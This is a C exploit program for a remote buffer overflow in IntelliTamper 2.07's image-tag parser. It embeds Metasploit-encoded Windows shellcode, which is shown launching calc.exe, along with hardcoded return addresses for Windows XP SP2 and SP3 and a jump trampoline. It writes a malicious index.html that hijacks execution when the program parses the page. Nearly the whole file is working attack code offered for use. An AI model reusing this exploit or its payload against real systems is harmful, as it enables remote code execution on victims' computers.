/*
* IntelliTamper 2.07 (imgsrc) Remote Buffer Overflow Expoit
*
* Discovered & Written by r0ut3r (writ3r [at] gmail.com)
*
* IntelliTamper contains a remote buffer overflow vulnerability.
* The HTML parser, more precise the image tag fails to preform
* boundary checks on supplied data.
*
* kit:/home/r0ut3r/public_html/imgsrc-xpl # gcc -o yahh yahh.c
* kit:/home/r0ut3r/public_html/imgsrc-xpl # ./yahh 0
* [!] OS: Microsoft Windows XP Pro SP 2
* [+] Building payload
* [+] Inserting JMP code
* [+] Success writing to index.html
* kit:/home/r0ut3r/public_html/imgsrc-xpl #
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* win32_exec -  EXITFUNC=thread CMD=c:\windows\system32\calc.exe Size=184
Encoder=PexFnstenvSub http://metasploit.com
Filtered characters: 0x00 0x22 0x09 0x0a 0x0d 0x3c 0x3e */
unsigned char shellcode[] =
"\x31\xc9\x83\xe9\xd8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x99"
"\xeb\x8d\x6a\x83\xeb\xfc\xe2\xf4\x65\x03\xc9\x6a\x99\xeb\x06\x2f"
"\xa5\x60\xf1\x6f\xe1\xea\x62\xe1\xd6\xf3\x06\x35\xb9\xea\x66\x23"
"\x12\xdf\x06\x6b\x77\xda\x4d\xf3\x35\x6f\x4d\x1e\x9e\x2a\x47\x67"
"\x98\x29\x66\x9e\xa2\xbf\xa9\x6e\xec\x0e\x06\x35\xbd\xea\x66\x0c"
"\x12\xe7\xc6\xe1\xc6\xf7\x8c\x81\x12\xf7\x06\x6b\x72\x62\xd1\x4e"
"\x9d\x28\xbc\xaa\xfd\x60\xcd\x5a\x1c\x2b\xf5\x66\x12\xab\x81\xe1"
"\xe9\xf7\x20\xe1\xf1\xe3\x66\x63\x12\x6b\x3d\x6a\x99\xeb\x06\x02"
"\xa5\xb4\xbc\x9c\xf9\xbd\x04\x92\x1a\x2b\xf6\x3a\xf1\x04\x43\x8a"
"\xf9\x83\x15\x94\x13\xe5\xda\x95\x7e\x88\xb7\x36\xee\x82\xe3\x0e"
"\xf6\x9c\xfe\x36\xea\x92\xfe\x1e\xfc\x86\xbe\x58\xc5\x88\xec\x06"
"\xfa\xc5\xe8\x12\xfc\xeb\x8d\x6a";

#define JMP 0xe9 //JMP

int main(int argc, char* argv[])
{
    FILE *fd;
    unsigned char buff[4000],
                *jmpref,
                *p;
    int opt;

    struct
    {
        char *os;
        unsigned int eip;
    } targets[] =
        {
            "Microsoft Windows XP Pro SP 2",
            0x7d040e1f,

            "Microsoft Windows XP Pro SP 3",
            0x7c8369f0
        };

    if (argc < 2)
    {
        printf("---------------------------------------------------------\n");
        printf("     IntelliTamper 2.07 Remote Buffer Overflow Expoit    \n\n");

        printf("  Discovered & Written by r0ut3r (writ3r [at] gmail.com)\n");
        printf("       Thanks to Luigi Auriemma (http://aluigi.org)\n\n");

        printf("  Usage: %s <OS-type>\n", argv[0]);
        printf("      0: Microsoft Windows XP Pro SP2\n");
        printf("      1: Microsoft Windows XP Pro SP3\n");
        printf("---------------------------------------------------------\n");
        return 1;
    }

    p = buff;

    switch (atoi(argv[1]))
    {
        case 0:
            opt = 0;
            printf("[!] OS: %s\n", targets[0].os);
        break;

        case 1:
            opt = 1;
            printf("[!] OS: %s\n", targets[1].os);
        break;
    }

    printf("[+] Building payload\n");
    p += sprintf(p, "<img src=\"http://");

    jmpref = p;

    p += sprintf(p, "%s", shellcode);

    int i;
    int a = 3065 - (p - jmpref);
    for (i=0; i < a; i++)
        *p++ = 'A';

    *(unsigned int *) p = targets[opt].eip;
    p += 4;

    printf("[+] Inserting JMP code\n");

    *p++ = JMP;
    *(unsigned int *) p = jmpref - (p + 4); //JMP -(3065+4+5)
    p += 4;

    p += sprintf(p, "\">");

    fd = fopen("index.html", "wb");
    if (fd == NULL)
    {
        perror("[-] Failed opening index.html\n");
        return 1;
    }

    fwrite(buff, 1, p - buff, fd);
    if (fclose(fd) == 0)
        printf("[+] Success writing to index.html\n");
    else
        printf("[-] Failed writing to index.html\n");

    return 0;
}
